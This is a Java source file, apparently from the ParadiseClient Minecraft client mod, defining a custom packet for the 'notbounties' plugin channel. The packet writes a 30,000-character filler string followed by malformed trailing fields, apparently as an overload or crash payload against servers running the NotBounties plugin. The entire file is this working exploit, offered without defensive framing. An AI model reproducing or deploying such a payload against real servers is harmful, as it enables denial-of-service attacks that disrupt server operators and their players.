package io.github.spigotrce.paradiseclientfabric.packet;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

public record NotBountiesPayloadPacket() implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, NotBountiesPayloadPacket> CODEC = CustomPayload.codecOf(NotBountiesPayloadPacket::write, NotBountiesPayloadPacket::new);
    public static final Id<NotBountiesPayloadPacket> ID = new Id<>(Identifier.of("notbounties", "main"));

    private NotBountiesPayloadPacket(PacketByteBuf buf) {
        this();
    }

    private void write(PacketByteBuf buf) {
        ByteArrayDataOutput out = ByteStreams.newDataOutput();
        out.writeUTF("a".repeat(30000));
        out.writeShort(0);
        out.write(ByteStreams.newDataOutput().toByteArray());
        buf.writeBytes(out.toByteArray());
    }

    public Id<NotBountiesPayloadPacket> getId() {
        return ID;
    }
}
